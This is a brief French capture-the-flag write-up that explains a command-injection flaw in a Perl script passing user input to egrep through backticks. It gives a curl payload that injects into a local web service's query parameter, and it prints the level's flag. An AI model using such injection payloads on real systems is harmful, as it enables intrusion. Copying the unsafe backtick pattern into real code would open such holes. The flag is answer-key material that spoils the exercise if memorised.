1. En regardant le fichier perl on comprends que son fonctionnement
2. La ligne la plus importante est celle-ci `@output = `egrep "^$xx" /tmp/xd 2>&1`;`
3. On ecrit donc un payload permettant d'exploiter la vulnerabilite
   ```
   curl '127.0.0.1:4646/?x="<.||".'
   ```

> Flag: g1qKMiRpXf53AWhDaU7FEkczr
